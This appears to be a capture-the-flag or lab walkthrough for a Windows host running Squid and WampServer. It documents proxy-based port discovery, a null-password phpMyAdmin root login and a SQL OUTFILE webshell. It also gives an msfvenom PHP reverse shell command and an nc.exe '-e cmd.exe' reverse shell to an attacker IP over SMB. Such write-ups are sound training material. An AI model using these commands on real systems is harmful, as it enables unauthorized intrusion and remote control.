## IP

192.168.57.189

## NMAP TCP

```nmap-tcp-squid
??$ nmap -sC -sV 192.168.57.189 -Pn                                                        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-28 15:55 UTC
Nmap scan report for 192.168.57.189
Host is up (0.00096s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3128/tcp open  http-proxy    Squid http proxy 4.14
|_http-server-header: squid/4.14
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-28T15:55:57
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.32 seconds
```

## 3128 (Squid Proxy)

Use [Spose](https://github.com/aancw/spose.git) to test internally acessible ports

```spose-usage
??$ python spose.py --proxy http://192.168.57.189:3128 --target 192.168.57.189
Using proxy address http://192.168.57.189:3128
192.168.57.189 3306 seems OPEN 
192.168.57.189 8080 seems OPEN 
```

Found 3306 and 8080 open

Setup http proxy through this in Firefox

## 8080 Internal

It's a Wampserver

Apache 2.4-MySQL 5 & 8-MariaDB 10-PHP 5 & 7 

3306 is the MySQL port for MySQL 5.7.31

192.168.57.189:8080/phpmyadmin -> PHP MyAdmin

Default credentials:
```phpmyadmin-creds
root

```

null password worked, logged into PHPMyAdmin as root connected to the MySQLServer

Used SQL to OUTFILE to create a webshell for file upload:

[payload](https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f?ref=benheater.com)

Uploaded msfvenom php shell:

```msfvenom-phpshell
msfvenom -p php/reverse_php LHOST=192.168.49.57 LPORT=443 -f raw -o shell.php
```

Connection via nc listener

Upgraded shell to cmd via:

```smbserver-nc-shell
cp /usr/share/windows-resources/binaries/nc.exe .
smbserver.py -smb2support -username evil -password evil evil $PWD
```

On Target:

```smbshare-receive
net use z: \\192.168.49.57\evil /user:evil evil
Z:\nc.exe 192.168.49.57 80 -e cmd.exe
```

## Local Privilege Enumeration

```local-whoami-all
C:\wamp\www>whoami /all
whoami /all

USER INFORMATION
----------------

User Name                  SID     
========================== ========
nt authority\local service S-1-5-19


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                                                              Attributes                                        
====================================== ================ ================================================================================================ ==================================================
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                                                                                       
Everyone                               Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                                                          Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263 Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-383293015-3350740429-1839969850-1819881064-1569454686-4198502490-78857879-1413643331    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-2035927579-283314533-3422103930-3587774809-765962649-3034203285-3544878962-607181067    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-11742800-2107441976-3443185924-4134956905-3840447964-3749968454-3843513199-670971053    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-3523901360-1745872541-794127107-675934034-1867954868-1951917511-1111796624-2052600462   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

ERROR: Unable to get user claims information.
```


No service related impersonate privileges

**READ** [THIS](https://itm4n.github.io/localservice-privileges/)

[Exploit based on this](https://github.com/itm4n/FullPowers)
